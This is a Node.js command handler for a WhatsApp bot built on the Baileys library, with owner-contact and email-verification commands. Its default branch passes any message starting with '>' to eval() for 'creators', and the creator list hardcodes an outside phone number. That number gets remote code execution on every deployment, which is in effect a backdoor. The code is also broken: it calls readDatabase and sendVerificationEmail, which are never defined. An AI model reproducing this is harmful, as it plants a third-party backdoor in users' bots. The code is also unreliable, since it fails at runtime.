require("./settings");
const {
  addUserData,
  verifyUser,
  validateVerification,
} = require("./database/database");
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
} = require("@adiwajshing/baileys");
const fs = require("fs");
const os = require("os");
const util = require("util");
const chalk = require("chalk");
const axios = require("axios");
const moment = require("moment-timezone");
const ms = (toMs = require("ms"));
const FormData = require("form-data");
const { fromBuffer } = require("file-type");
const { fetchBuffer } = require("./lib/myfunc2");
const fetch = require("node-fetch");
const { exec, spawn, execSync } = require("child_process");
const fsx = require("fs-extra");

const { smsg, fetchJson, getBuffer } = require("./lib/simple");

async function getGroupAdmins(participants) {
  let admins = [];
  for (let i of participants) {
    i.admin === "superadmin"
      ? admins.push(i.id)
      : i.admin === "admin"
      ? admins.push(i.id)
      : "";
  }
  return admins || [];
}

function msToDate(mse) {
  temp = mse;
  days = Math.floor(mse / (24 * 60 * 60 * 1000));
  daysms = mse % (24 * 60 * 60 * 1000);
  hours = Math.floor(daysms / (60 * 60 * 1000));
  hoursms = mse % (60 * 60 * 1000);
  minutes = Math.floor(hoursms / (60 * 1000));
  minutesms = mse % (60 * 1000);
  sec = Math.floor(minutesms / 1000);
  return days + " Days " + hours + " Hours " + minutes + " Minutes";
}

const isUrl = (url) => {
  return url.match(
    new RegExp(
      /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/,
      "gi"
    )
  );
};

const sleep = async (ms) => {
  return new Promise((resolve) => setTimeout(resolve, ms));
};

const getRandom = (ext) => {
  return `${Math.floor(Math.random() * 10000)}${ext}`;
};

const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};

const jsonformat = (string) => {
  return JSON.stringify(string, null, 2);
};

const tanggal = (numer) => {
  myMonths = [
    "Januari",
    "Februari",
    "Maret",
    "April",
    "Mei",
    "Juni",
    "Juli",
    "Agustus",
    "September",
    "Oktober",
    "November",
    "Desember",
  ];
  myDays = ["Minggu", "Senin", "Selasa", "Rabu", "Kamis", "Jum�at", "Sabtu"];
  var tgl = new Date(numer);
  var day = tgl.getDate();
  bulan = tgl.getMonth();
  var thisDay = tgl.getDay(),
    thisDay = myDays[thisDay];
  var yy = tgl.getYear();
  var year = yy < 1000 ? yy + 1900 : yy;
  const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
  let d = new Date();
  let locale = "id";
  let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
  let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
    Math.floor((d * 1 + gmt) / 84600000) % 5
  ];

  return `${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`;
};

module.exports = rul = async (
  rul,
  m,
  chatUpdate,
  store,
  opengc,
  antilink,
  antiwame,
  antilink2,
  antiwame2,
  set_welcome_db,
  set_left_db,
  set_proses,
  set_done,
  set_open,
  set_close,
  sewa,
  _welcome,
  _left,
  db_respon_list
) => {
  try {
    var body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId ||
          m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
          m.text
        : "";
    var budy = typeof m.text == "string" ? m.text : "";
    const isCmd = /^[\!]/.test(body); // Prefix command, e.g., '!'
    const prefix = isCmd ? budy[0] : "";
    const command = isCmd
      ? body.slice(1).trim().split(" ")[0].toLowerCase()
      : "";
    const args = body.trim().split(/ +/).slice(1);
    const pushname = m.pushName || "No Name";
    const botNumber = await rul.decodeJid(rul.user.id);
    const isCreator = [
      "6283136394680@s.whatsapp.net",
      botNumber,
      ...global.owner,
    ]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(m.sender);

    // Fungsi untuk membalas pesan
    const reply = async (text) => {
      return await rul.sendFakeLink(m.chat, text, "good", pushname, m);
    };

    // Fungsi untuk mengecek status verifikasi pengguna
    function checkVerificationStatus(number) {
      const db = readDatabase();
      const user = db.find((user) => user.number === number);

      if (!user) {
        // Pengguna belum terdaftar
        return null;
      }

      return user.verified;
    }

    switch (command) {
      case "owner":
        {
          // Mengecek status verifikasi pengguna
          const isVerified = checkVerificationStatus(m.sender);

          if (!isVerified) {
            // Jika belum terverifikasi, beri peringatan untuk verifikasi
            reply(
              "You need to verify your email first. Please check your email for the verification code."
            );
            sendVerificationEmail(m.sender); // Kirim email verifikasi
            return;
          }

          // Jika sudah terverifikasi, lanjutkan perintah owner
          rul.sendContact(m.chat, global.owner, m);
        }
        break;

      case "verifyemail":
        {
          const email = args[0]; // Ambil email dari argumen
          if (!email) {
            reply("Please provide an email address to verify.");
            return;
          }

          // Simpan pengguna baru dan kirimkan email verifikasi
          const success = addUserData(m.sender, email);
          if (success) {
            reply(
              `User registered. A verification code has been sent to ${email}. Please check your inbox.`
            );
            sendVerificationEmail(m.sender); // Kirim email verifikasi
          } else {
            reply(
              "You are already registered. Please check your email for the verification code."
            );
          }
        }
        break;

      default:
        if (budy.startsWith(">")) {
          if (!isCreator) return;
          try {
            let evaled = await eval(budy.slice(2));
            if (typeof evaled !== "string")
              evaled = require("util").inspect(evaled);
            await reply(evaled);
          } catch (err) {
            await reply(util.format(err));
          }
        }
    }
  } catch (err) {
    m.reply(util.format(err));
  }
};
